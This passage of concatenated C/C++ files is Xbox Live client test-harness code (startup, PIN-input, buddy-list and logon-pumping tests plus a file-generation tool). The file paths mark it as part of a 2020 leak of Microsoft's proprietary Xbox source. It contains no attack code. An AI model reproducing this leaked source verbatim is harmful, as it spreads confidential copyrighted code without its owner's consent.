    EXECUTE( XOnlinePINStartInput_NullInputState() );
    
	//
    // Test XOnlinePINStartInput with a valid input state
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlinePINStartInput", "ValidInputState" );
    EXECUTE( XOnlinePINStartInput_ValidInputState() );

	CHECKRUN( CloseNetwork() );
}

/****************************************************************************
 *
 *  XOnlinePINStartInput_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlinePINStartInput_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlinePINStartInput_StartTest( NULL );
    XOnlinePINStartInput_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlinePINStartInput )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlinePINStartInput )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlinePINStartInput_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlinePINStartInput_EndTest )
END_EXPORT_TABLE( XOnlinePINStartInput )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineStartup\XOnlineStartup.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineStartup.cpp
 *  Content:    XOnlineStartup tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *   1/14/01    davidhef Created to test Xbox XOnlineStartup
 *
 ****************************************************************************/

#include "XOnlineStartup.h"
#include <XOnline.h>

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 *  XOnlineStartup_BasicTest
 *
 *  Description:
 *      Basic Test for XOnlineStartup
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineStartup_BASIC_TEST( void )
{
    HRESULT             hr              = S_OK;
    DWORD               dwResult = 0;
	XNADDR				xnaddr;
    const int spinCount = BVTMode() ? 1 : 10;
    
    for (int i = 0; i < spinCount && SUCCEEDED(hr); ++i)
    {
        hr = XOnlineStartup( NULL );
        if (SUCCEEDED(hr))
        {
            //
            // wait for DNS to succeed
            //
            do
            {
                dwResult = XNetGetTitleXnAddr( &xnaddr );  	
            } 
            while ( XNET_GET_XNADDR_PENDING == dwResult );
            
            hr = XOnlineCleanup();
        }
    }
    
    return hr;
}

HRESULT XOnlineStartup_NO_CLEANUP( void )
{
    HRESULT             hr              = S_OK;
    DWORD               dwResult = 0;
	XNADDR				xnaddr;
    const int spinCount = BVTMode() ? 1 : 10;
    
    for (int i = 0; i < spinCount && SUCCEEDED(hr); ++i)
    {
        hr = XOnlineStartup( NULL );
        if (SUCCEEDED(hr))
        {
            //
            // wait for DNS to succeed
            //
            do
            {
                dwResult = XNetGetTitleXnAddr( &xnaddr );  	
            } 
            while ( XNET_GET_XNADDR_PENDING == dwResult );
        }
    }
    
    if (SUCCEEDED(hr))
    {
        for (int i = 0; i < spinCount && SUCCEEDED(hr); ++i)
        {
            hr = XOnlineCleanup();
        }
    }

    return hr;
}

HRESULT XOnlineStartup_NO_STARTUP( void )
{
    HRESULT             hr              = S_OK;
    DWORD               dwResult = 0;
    XNADDR				xnaddr;
    const int spinCount = BVTMode() ? 1 : 10;

    for (int i = 0; i < spinCount && SUCCEEDED(hr); ++i)
    {
        //
        // wait for DNS to succeed
        //
        dwResult = XNetGetTitleXnAddr( &xnaddr );
        hr = (XNET_GET_XNADDR_NONE == dwResult) ? S_OK : E_FAIL;
        
        if (SUCCEEDED(hr))
        {
            hr = XOnlineCleanup();
            hr = (SUCCEEDED(hr)) ? E_FAIL : S_OK;
        }
    }
    
    return hr;
}

/****************************************************************************
 *
 *  XOnlineStartup_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlineStartup tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineStartup_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

    //
    // Test XOnlineStartup in the mannor it was meant to be called
    //

    SETLOG( LogHandle, "davidhef", "Online", "XOnlineStartup", "BASIC_TEST" );
    EXECUTE( XOnlineStartup_BASIC_TEST() );

    if (!BVTMode())
    {
        SETLOG( LogHandle, "davidhef", "Online", "XOnlineStartup", "NO_CLEANUP" );
        EXECUTE( XOnlineStartup_NO_CLEANUP() );
        
        SETLOG( LogHandle, "davidhef", "Online", "XOnlineStartup", "NO_STARTUP" );
        EXECUTE( XOnlineStartup_NO_STARTUP() );
    }
}

/****************************************************************************
 *
 *  XOnlineStartup_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineStartup_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlineStartup_StartTest( NULL );
    XOnlineStartup_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlineStartup )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlineStartup )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlineStartup_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlineStartup_EndTest )
END_EXPORT_TABLE( XOnlineStartup )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineRemoveCachedUser\XOnlineRemoveCachedUser.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineRemoveCachedUser.h
 *  Content:    XOnlineRemoveCachedUser utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/28/01    danrose Created to test Xbox XOnlineRemoveCachedUser
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xtestlib.h>
#include <xlog.h>
#include <macros.h>
#include <macros.h>
#include <OnlineAccounts.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\bldfiles\bldfiles.cpp ===
/*----------------------------------------------------------------------------
 *  Copyright  1997 Microsoft.  ALL RIGHTS RESERVED. 
 *----------------------------------------------------------------------------
 *  Date: 10/24/00
 *  Developer: Sean Wohlgemuth
 *----------------------------------------------------------------------------
 */

#ifdef _XBOX
#include <xtl.h>
extern "C" { 
	ULONG DebugPrint(PCHAR Format, ...);
}
#else
#include <windows.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include "bldfiles.h"

/*	InitBuffer - Initializes the buffer used to create the data of in the files
		being generated.

	rgchBuffer - Buffer to hold data
	iSize - size of rgchBuffer in bytes
*/
HRESULT InitBuffer(char* rgchBuffer, int iSize){
	
	if (NULL==rgchBuffer)
		return E_INVALIDARG;
	if (0>=iSize)
		return E_INVALIDARG;

	bool bExtra=false;
	if ((iSize % 2)==1) bExtra=true;
	for (int i=0; i<iSize/2; i++){
		memcpy(&rgchBuffer[i*2],"01",2);
	}//endfor
	if (bExtra){
		rgchBuffer[iSize-1]='0';
	}//endif
	//memset(rgchBuffer,'A',iSize);

	return S_OK;

}//endmethod

/* See header */
HRESULT BuildFilesOfSize(unsigned __int64 hStart, DWORD dwCount, char* pszPath){

	const iBufferSize=1024;
	char rgchBuffer[iBufferSize];
	char pszFileName[13];

	FILE* pf=NULL;
	unsigned int uiBlocks=0;
	unsigned int uiRemainder=0;
	unsigned __int64 hcCount=0l;

	//Initialize buffer
	if FAILED(InitBuffer(rgchBuffer,iBufferSize)){
		return E_FAIL;
	}//endif

	//Create files
	for (hcCount=hStart; hcCount<=(dwCount+hStart-1); hcCount++){

		uiRemainder=uiBlocks=0;

		//Calculate blocks and remainder
		uiBlocks= (int)(hcCount / iBufferSize);
		uiRemainder=(int)(hcCount % iBufferSize);

		//Open file
		#ifdef _XBOX
			sprintf(pszFileName,"%s%08X.%03X",pszPath,uiBlocks,uiRemainder);
		#else
			sprintf(pszFileName,"%s%08X.%03X",pszPath,uiBlocks,uiRemainder);
		#endif
		if ((pf=fopen(pszFileName,"w"))==NULL)
			return E_FAIL;

		//Write blocks
		for (unsigned int uicBlocks=0; uicBlocks<uiBlocks; uicBlocks++){
			if (fwrite(rgchBuffer,sizeof(char),iBufferSize,pf)!=iBufferSize){
				return E_FAIL;
			}//endif
		}//endfor

		//Write remainder
		if (0<uiRemainder){
			if (fwrite(rgchBuffer,sizeof(char),uiRemainder,pf)!=uiRemainder){
				return E_FAIL;
			}//endif
		}//endif
		
		//Close file
		fflush(pf);

		if (NULL!=pf){
			fclose(pf);
			pf=NULL;
		}//endif

	}//endfor

	//Guaranteed cleanup
	if (NULL!=pf){
		fclose(pf);
		pf=NULL;
	}//endif

	return S_OK;

}//endmethod

#ifndef _XBOX
/*	main - Program Entry Point

	set dwStart and dwCount before execution
	see notes for Createfile parameters
*/

int __cdecl main(int argc, char *argv[ ]){

		unsigned __int64 hStart=0;
		DWORD dwCount=0;

		//Get arguments
		char rgchBuffer[255];
		if (3!=argc) goto usage;
		if (0==sscanf(argv[1],"%s",rgchBuffer)) goto usage;
		if (0==sscanf(argv[2],"%d",&dwCount)) goto usage;
		hStart=_atoi64(rgchBuffer);
		if ((0>hStart) || (0>=dwCount)) goto usage;

		//Create files
		BuildFilesOfSize(hStart, dwCount, ".\\");
		
		printf("File Creation Complete\n");

		return 0;

		//Usage
usage:
			printf("usage: %s start count\n",argv[0]);

		return -1;

}//endmethod
#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\buddies\bvt\xbudbvt.h ===
#ifndef __XBUDBVT_H__
#define __XBUDBVT_H__

//==================================================================================
// Includes
//==================================================================================
#include <xtl.h>
#include <winsockx.h>
#include <stdio.h>
#include <xtestlib.h>
#include <xlog.h>
#include <xonlinep.h>
#include <xnetref.h>
#include "OnlineAccounts.h"

namespace XBudBVTNamespace {

//==================================================================================
// Defines
//==================================================================================
#define ONFIX	1
#define SY_NEED_POPULATE_USERS	1
#define SY_NEED_CREATE_USERS	0
#define	SY_BLOCKING_IMPLEMENTED	0

#define	SY_RESULT			int
#define SY_SUCCESS			1
#define SY_STOPTESTCASE		0
#define SY_STOPWHOLETEST	-1


#define FRIEND_HANDLE_PUMP_COUNT         25
#define HARNESS_TITLE_ID				0xA7049955
#define	TIMELIMIT	                    100
#define SLEEPTIME                       50
#define ALLOWEDPUMPINGTIME              30000

#define CLEANUP_TASK(hTask)				if(hTask) \
										{ \
											XOnlineTaskClose(hTask); \
											hTask = NULL; \
										}
#define START_TESTCASE(TestName)	    xStartVariation(hLog, TestName);
#define END_TESTCASE				    PUMP_CS_AND_EXIT_IF_FAILED\
									    xEndVariation(hLog);

#define PASS_TESTCASE(PassMsg)		    xLog(hLog, XLL_PASS, PassMsg);
#define FAIL_TESTCASE(FailMsg)		    xLog(hLog, XLL_FAIL, FailMsg);
#define PUMP_CS_AND_EXIT_IF_FAILED		nResult = PumpLogonTask(hLog, hLogonTask, &hReturn);\
                                		if(SY_STOPWHOLETEST == nResult)\
                                		{\
                                			xEndVariation(hLog);\
                                			goto Exit;\
                                		}

__forceinline void DbgBreak()
{
    _asm int 3;
}

#define Verify(x)       do { if (!(x)) DbgBreak(); } while (0)


//==================================================================================
// Prototypes 
//==================================================================================
// Harness functions
BOOL WINAPI XBudBVTDllMain(IN HINSTANCE hInstance, IN DWORD dwReason, IN LPVOID lpContext);
VOID WINAPI XBudBVTStartTest(IN HANDLE hLog);
VOID WINAPI XBudBVTEndTest();

} // namespace XBudBVTNamespace

#endif // __XBudBVT_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\apitest\common.cpp ===
#include "common.h"

//==================================================================================
// LogonForTestExceptionFilter
//----------------------------------------------------------------------------------
//
// Description: 
//
// Arguments:
//
// Returns: 
//==================================================================================

BOOL LogonForTest(HANDLE hTestLog, HANDLE hLogonEvent, PXONLINETASK_HANDLE phLogonTask, 
							DWORD* pServices, DWORD cServices, DWORD dwMaxWaitInterval)
{
	XONLINE_USER        *pUsersArray;
	BOOL				bRet = TRUE;
	DWORD				dwNumUsers = 0, dwStartTime = 0, dwCurrentTime = 0, dwElapsedTime = 0;
	HRESULT 			hr, hrContinue;
	char 				szMsg[128];
	WCHAR				wszMsg[128];

	__try
	{
		// Get local users (we assume that the hard-drive has been populated)
	    pUsersArray =  (XONLINE_USER *) LocalAlloc(LPTR,XONLINE_MAX_STORED_ONLINE_USERS * sizeof(XONLINE_USER));
	    if(pUsersArray == NULL)        
			RaiseException(SY_EXCEPTION_MEM_ALLOC_FAIL, 0,0, NULL);

	    hr = XOnlineGetUsers( pUsersArray, &dwNumUsers );
		if (FAILED(hr))
			RaiseException(SY_EXCEPTION_GET_USERS_FAIL, 0,0, NULL);
		
		if(dwNumUsers == 0)
			RaiseException(SY_EXCEPTION_NO_USERS, 0,0, NULL);

		// Initialize services
		xLog(hTestLog, XLL_INFO, "Logging into %u services with %u users", cServices, dwNumUsers);
		hr = XOnlineLogon(pUsersArray, pServices, cServices, hLogonEvent, phLogonTask);
	   	LocalFree(pUsersArray);
		if (FAILED(hr))
			RaiseException(SY_EXCEPTION_LOGON_FAIL, 0,0, NULL);

		// Pump until logon succeeds (PARTIAL_RESULTS flag set) or fails (DONT_CONTINUE flag set)
		xLog(hTestLog, XLL_INFO, "Waiting for logon to finish");
		INT	iRet = PumpTaskUntilTimeout(hTestLog, *phLogonTask, hLogonEvent, ALLOWEDPUMPINGINTERVAL, NULL, FALSE, &hr);

		switch(iRet)
		{
			case SY_SUCCESS :
				wsprintf(wszMsg, TEXT("XOnlineLogonTask returned %0x at last\n"),hr);
				OutputDebugString(wszMsg);
				break;
			case SY_FAIL :
				wsprintf(wszMsg, TEXT("XOnlineLogonTask returned %0x at last\n"),hr);
				OutputDebugString(wszMsg);
				RaiseException(SY_EXCEPTION_LOGON_PUMP_FAIL, 0,0, NULL);
				break;
			case SY_TIMEOUT :
				wsprintf(wszMsg, TEXT("XOnlineLogonTask timed out at last\n"));
				OutputDebugString(wszMsg);
				RaiseException(SY_EXCEPTION_LOGON_PUMP_TIMEOUT, 0,0, NULL);
			break;
		}

		hr = XOnlineLogonTaskGetResults(*phLogonTask);
		xLog(hTestLog, XLL_INFO, "Logon returned 0x%08x", hr);
		if (hr == XONLINE_S_LOGON_CONNECTION_ESTABLISHED)
		{		  
			xLog(hTestLog, XLL_INFO, "Logon completed successfully");
		}
		else
		{
			xLog(hTestLog, XLL_INFO, "Logon failed asynchronously");
			RaiseException(SY_EXCEPTION_LOGONTASK_RESULT_WRONG, 0,0, NULL);
		}
	}

	__except(LogonForTestExceptionFilter(GetExceptionCode()))
	{
	    bRet = FALSE;
	    
	    switch(GetExceptionCode())
	    {
	    	case SY_EXCEPTION_MEM_ALLOC_FAIL:
	    		sprintf(szMsg, "Memory Allocation Fail");
	    		break;

	    	case SY_EXCEPTION_GET_USERS_FAIL:
		   		LocalFree(pUsersArray);
	    		sprintf(szMsg, "Getting users from hard-drive failed with 0x%08x", hr);
			
	    		break;

	    	case SY_EXCEPTION_NO_USERS:
		   		LocalFree(pUsersArray);
//				OutputDebugString(TEXT("No users were found on the hard-drive, run the SetupOnline tool!"));
	    		sprintf(szMsg, "No users were found on the hard-drive, run the SetupOnline tool!");
	    		break;

	    	case SY_EXCEPTION_LOGON_FAIL:
	    		sprintf(szMsg, "Logon failed");
	    		break;
			case SY_EXCEPTION_LOGON_PUMP_FAIL :
	    		sprintf(szMsg, "Logon Pumping failed");
	    		break;
			case SY_EXCEPTION_LOGON_PUMP_TIMEOUT :
	    		sprintf(szMsg, "Logon Pumping timedout");
	    		break;
			case SY_EXCEPTION_LOGONTASK_RESULT_WRONG :
	    		sprintf(szMsg, "Logon Task result is unexpected");
	    		break;
	    		

	    }

	    xLog(hTestLog, XLL_INFO, szMsg);
	}

	return(bRet);
}			


//==================================================================================
// LogonForTestExceptionFilter
//----------------------------------------------------------------------------------
//
// Description: 
//
// Arguments:
//
// Returns: 
//==================================================================================

LONG LogonForTestExceptionFilter(DWORD dwExceptionCode)
{
	LONG lRet = EXCEPTION_CONTINUE_SEARCH;
	
	switch(dwExceptionCode)
	{
		case SY_EXCEPTION_GET_USERS_FAIL :
		case SY_EXCEPTION_NO_USERS :
		case SY_EXCEPTION_MEM_ALLOC_FAIL :
		case SY_EXCEPTION_LOGON_FAIL :	
		case SY_EXCEPTION_LOGON_PUMP_FAIL :
		case SY_EXCEPTION_LOGON_PUMP_TIMEOUT :
		case SY_EXCEPTION_LOGONTASK_RESULT_WRONG :
			lRet = EXCEPTION_EXECUTE_HANDLER;
			break;

		default:
			break;
	}

	return lRet;
}

//==================================================================================
// PumpTaskUntilTimeout	: Done
//----------------------------------------------------------------------------------
//
// Description: Calls the XOnlineTaskContinue function until either the given
//    task has been completed or the amount of available time has expired
//
// Arguments:
//	IN XONLINETASK_HANDLE	hTask		Handle to async task
//	IN HANDLE				hEvent		Event that is associated with this async task.
//											This can be set to NULL or INVALID_HANDLE_VALUE
//											if no event is associated with the task
//	IN DWORD				dwMaxWaitInterval		Maximum amount of time to wait for the task to
//											complete. This can be set to INFINITE to block
//											until completion
//	OUT DWORD				*pdwPollCounter		Optional counter passed in to keep track of the
//											number of calls made to the XOnlineTaskDoWork function
//  IN BOOL					bCloseOnComplete	Indicates whether the function should close a handle
//											after it indicates completion
//  OUT HRESULT				*hrReturn	
//
// Returns: SY_SUCCESS, SY_FAIL or SY_TIMEOUT
//==================================================================================
INT PumpTaskUntilTimeout(HANDLE hTestLog, XONLINETASK_HANDLE hTask, HANDLE hEvent, DWORD dwMaxWaitInterval, 
									DWORD *pdwPollCounter, BOOL bCloseOnComplete, HRESULT *hrReturn)
{
	INT			iResult = SY_TIMEOUT;
	DWORD 		dwStartTime;
	DWORD 		dwInternalPollCounter = 0;
	HRESULT 	hrContinue;

	dwStartTime = GetTickCount();

	do
	{
		if((hEvent != INVALID_HANDLE_VALUE) && (hEvent != NULL))
			WaitForSingleObject(hEvent, dwMaxWaitInterval);

		hrContinue = XOnlineTaskContinue(hTask);
		++dwInternalPollCounter;

		if (XONLINETASK_S_RUNNING == hrContinue) // same as if (XONLINETASK_STATUS_AVAILABLE(hrContinue))
		{
			if(dwMaxWaitInterval != INFINITE)
			{
				// See if we have gone beyond the maximum allowed time
				if(IsTimeExpired(dwStartTime, dwMaxWaitInterval))
				{
					DbgPrint("Async opration didn't complete within %u ms\n", dwMaxWaitInterval);
					xLog(hTestLog, XLL_INFO, "PumpTask Timed out");
					iResult = SY_TIMEOUT;
					break;
				}
				else
				{
					Sleep(SLEEPINTERVAL);
				}
			}
		}
		else if (SUCCEEDED(hrContinue))	// same as if (XONLINETASK_STATUS_SUCCESSFUL_COMPLETION(hrContinue))
		{
			iResult = SY_SUCCESS;
		    *hrReturn = hrContinue;
			xLog(hTestLog, XLL_INFO, "PumpTask Succedded");
		    break;
		}
		else
		{
			iResult = SY_FAIL;
		    *hrReturn = hrContinue;
			xLog(hTestLog, XLL_INFO, "PumpTask Failed");
		    break;
		}
	} while(TRUE);

	if(pdwPollCounter)
		*pdwPollCounter = dwInternalPollCounter;

	if(bCloseOnComplete)
		XOnlineTaskClose(hTask);


	return iResult;
}

//==================================================================================
// IsTimeExpired	: Done
//----------------------------------------------------------------------------------
//
// Description: 
Check if allowed time is expired
//
// Arguments:
//	DWORD	dwStartTime, DWORD dwAllowedInterval
// Returns:
//	TRUE if expired.
//==================================================================================

BOOL	IsTimeExpired(DWORD	dwStartTime, DWORD dwAllowedInterval)
{
	DWORD dwCurrentTime = GetTickCount(), dwDuration;

	if(dwCurrentTime < dwStartTime)
		dwDuration = (MAXDWORD - dwStartTime) + dwCurrentTime;
	else
		dwDuration = dwCurrentTime - dwStartTime;

	if(dwDuration > dwAllowedInterval)
		return TRUE;
	else
		return FALSE;
}
		


//==================================================================================
// PumpLogonTask	: Done
//----------------------------------------------------------------------------------
//
// Description: Pump Logon Task 
//
// Arguments:
//	HANDLE  hTestLog, XONLINETASK_HANDLE hLogonTask
// Returns:
//	FALSE if pumping fails and it will block whole test case after now.
//==================================================================================

BOOL PumpLogonTask(HANDLE  hTestLog, XONLINETASK_HANDLE hLogonTask, HRESULT* phrReturn)
{
	*phrReturn = XOnlineTaskContinue(hLogonTask); 
	
	if(FAILED(*phrReturn)) 
	{
	    xLog(hTestLog, XLL_FAIL, "Lost connection with CS, exiting test!");
	    return FALSE;
	}

	return TRUE;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\AsyncTask.h ===
// AsyncTask.h: interface for the CAsyncTask class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include <xtl.h>
#include <winsockx.h>
#include <stdio.h>
#include <xtestlib.h>
#include <xlog.h>
#include <xonlinep.h>

#define LOGTASKINFO(log, string) log ? xLog(log, XLL_INFO, "%s", string) : 0;
#define LOGTASKINFOHR(log, string, hr) log ? xLog(log, XLL_INFO, "%s:%s(0x%08x)", string, CAsyncTask::GetTaskErrorString(hr), hr) : 0;

class CAsyncTask  
{
public:
	BOOL WaitForWork(DWORD dwUntilTickCount);
	BOOL IsTaskComplete();
	HRESULT GetLastResult();
	HRESULT TaskContinue();
	static char * GetTaskErrorString(HRESULT hr);
	void RegisterLogHandle(HANDLE hLog);
	CAsyncTask();
	virtual ~CAsyncTask();

protected:
	HANDLE m_hLog;
	HRESULT m_hrLastResult;
	HANDLE m_hWorkEvent;
	XONLINETASK_HANDLE m_hTask;
};

HRESULT WaitAndPump(DWORD dwWorkUntil, CAsyncTask *pTask);
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\apitest\common.h ===
#ifndef __COMMON_H_IN_ONLINE_CLIENT__
#define __COMMON_H_IN_ONLINE_CLIENT__

//==================================================================================
// Includes
//==================================================================================
#include <xtl.h>
#include <winsockx.h>
#include <stdio.h>
#include <xtestlib.h>
#include <xlog.h>
#include <xonlinep.h>
#include <xnetref.h>
#include "OnlineAccounts.h"



//==================================================================================
// Defines
//==================================================================================
#define HARNESS_TITLE_ID				0xA7049955
#define SLEEPINTERVAL                   50
#define ALLOWEDLOGONINTERVAL           	30000
#define ALLOWEDPUMPINGINTERVAL          30000

#define	SY_NULL							0
#define SY_NONNULL						1

#define SY_SUCCESS 						1
#define SY_FAIL 						-1
#define SY_TIMEOUT 						-2
#define SY_STOP_WHOLE_TEST	    		-3
#define SY_FAIL_THIS_TESTCASE			-1


#define SY_EXCEPTION_STOP_WHOLE_TEST	    0xe0000001
#define SY_EXCEPTION_FAIL_THIS_TESTCASE		0xe0000002

#define SY_EXCEPTION_MEM_ALLOC_FAIL			0xe0000011
#define SY_EXCEPTION_GET_USERS_FAIL			0xe0000012
#define SY_EXCEPTION_NO_USERS				0xe0000013
#define SY_EXCEPTION_LOGON_FAIL				0xe0000014
#define SY_EXCEPTION_LOGON_PUMP_FAIL		0xe0000015
#define SY_EXCEPTION_LOGON_PUMP_TIMEOUT		0xe0000016
#define SY_EXCEPTION_LOGONTASK_RESULT_WRONG	0xe0000017



#define CLEANUP_TASK(hTask)				if(hTask) \
										{ \
											XOnlineTaskClose(hTask); \
											hTask = NULL; \
										}
#define START_TESTCASE(hTestLog,TestName)	    xStartVariation(hTestLog, TestName);
#define END_TESTCASE(HTestLog)				    xEndVariation(hTestLog);

#define PASS_TESTCASE(hTestLog,PassMsg)		    xLog(hTestLog, XLL_PASS, PassMsg);
#define FAIL_TESTCASE(hTestLog,FailMsg)		    xLog(hTestLog, XLL_FAIL, FailMsg);
//#define FAIL_TESTCASE_AND_RAISE_EXCEPT(FailMsg)		    xLog(hTestLog, XLL_FAIL, FailMsg);\
//                                        RaiseException(SY_EXCEPTION_FAIL_THIS_TESTCASE,0,0,NULL);
#define PUMP_CS_AND_EXIT_IF_FAILED(hTestLog, hLogonTask)\
	{\
		HRESULT hrPump;\
		hrPump = PumpLogonTask(hTestLog, hLogonTask, &hrPump);\
		if(FAILED(hrPump))\
			RaiseException(SY_EXCEPTION_STOP_WHOLE_TEST, 0,0, NULL);\
	}
#define RaiseExceptionIfNecessary(iResult) \
		    if((iResult) == SY_FAIL_THIS_TESTCASE || (iResult) == SY_TIMEOUT) \
				RaiseException(SY_EXCEPTION_FAIL_THIS_TESTCASE, 0,0, NULL); \
		    else if((iResult) == SY_EXCEPTION_STOP_WHOLE_TEST) \
		    	RaiseException(SY_EXCEPTION_STOP_WHOLE_TEST, 0, 0, NULL);


__forceinline void DbgBreak()
{
    _asm int 3;
}

#define Verify(x)       do { if (!(x)) DbgBreak(); } while (0)

//==================================================================================
// Functions
//==================================================================================
BOOL LogonForTest(HANDLE hTestLog, HANDLE hLogonEvent, PXONLINETASK_HANDLE phLogonTask, 
							DWORD* pServices, DWORD cServices, DWORD dwMaxWaitInterval);
LONG LogonForTestExceptionFilter(DWORD dwExceptionCode);
INT PumpTaskUntilTimeout(HANDLE hTestLog, XONLINETASK_HANDLE hTask, HANDLE hEvent, DWORD dwMaxWaitInterval, 
									DWORD *pdwPollCounter, BOOL bCloseOnComplete, HRESULT *hrReturn);
BOOL IsTimeExpired(DWORD	dwStartTime, DWORD dwAllowedInterval);
BOOL PumpLogonTask(HANDLE  hTestLog, XONLINETASK_HANDLE hLogonTask, HRESULT* phrReturn);

//==================================================================================
// Global Variables
//==================================================================================
extern HANDLE g_hTestLog;



#endif // __COMMON_H_IN_ONLINE_CLIENT__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\buddies\bvt\xbudbvt.cpp ===
//==================================================================================
// Includes
//==================================================================================
#define INITGUID
#include "xbudbvt.h"

#define	BUG10049REGRESS	1
        
using namespace XBudBVTNamespace;

namespace XBudBVTNamespace {

//==================================================================================
// Globals
//==================================================================================
XONLINE_USER g_LoggedOnUsers[XONLINE_MAX_LOGON_USERS];
DWORD g_dwNumLoggedOnUsers = 0;
HANDLE g_hHeap = NULL;

//==================================================================================
// Internal Functions
//==================================================================================
SY_RESULT PumpFriendTask(HANDLE  hLog, XONLINETASK_HANDLE hLogonTask, XONLINETASK_HANDLE hGameOpTask, 
							XONLINETASK_HANDLE hEnumGamesTask[], XONLINETASK_HANDLE hLockoutTask, UINT count,
							HRESULT* phrReturn);
SY_RESULT PumpLogonTask(HANDLE  hLog, XONLINETASK_HANDLE hLogonTask, HRESULT* phrReturn);
BOOL	IsValidResultForFriendList(HANDLE  hLog, DWORD dwNumOfExpectedFriend, DWORD dwNumOfReturnedFriend, 
									XONLINE_FRIEND *pFriendListExpected, XONLINE_FRIEND *pFriendListReturned);
BOOL	IsTimeFinished(DWORD	dwStart, DWORD dwAllowed);
HRESULT SY_CreateUserAccounts(DWORD dwNumAccounts );
BOOL IsLockoutUser(DWORD dwNumLockoutUsers, PXONLINE_LOCKOUTUSER  pLockoutlist, XUID xuid);


//==================================================================================
// PollTaskUntilComplete
//----------------------------------------------------------------------------------
//
// Description: Calls the XOnlineTaskComplete function until either the given
//    task has been completed or the amount of available time has expired
//
// Arguments:
//	XONLINETASK_HANDLE	hTask		Handle to async task
//	HANDLE				hEvent		Event that is associated with this async task.
//											This can be set to NULL or INVALID_HANDLE_VALUE
//											if no event is associated with the task
//	DWORD				dwMaxWaitTime		Maximum amount of time to wait for the task to
//											complete. This can be set to INFINITE to block
//											until completion
//	DWORD				*pdwPollCounter		Optional counter passed in to keep track of the
//											number of calls made to the XOnlineTaskContinue function
//	BOOL				*pfCompleted		Optional boolean passed in to keep track if whether
//											the task completed or not
//  BOOL				fCloseOnComplete	Indicates whether the function should close a handle
//											after it indicates completion
//
// Returns: The last result code from XOnlineTaskContinue is returned.  If a valid pointer
//   is provided for pfCompleted, it is updated to reflect whether the task has completed or not
//==================================================================================
HRESULT PollTaskUntilComplete(XONLINETASK_HANDLE hTask, HANDLE hEvent, DWORD dwMaxWaitTime, DWORD *pdwPollCounter, BOOL *pfCompleted, BOOL fCloseOnComplete)
{
	HRESULT hr = S_OK;
	DWORD dwLastTime = 0, dwCurrentTime = 0, dwCurrentDuration = 0, dwWaitTimeLeft = dwMaxWaitTime;
	DWORD dwInternalPollCounter = 0;
	HRESULT hrContinue;

	if(pfCompleted)
		*pfCompleted = FALSE;

	dwLastTime = GetTickCount();

	do
	{

		if((hEvent != INVALID_HANDLE_VALUE) && (hEvent != NULL))
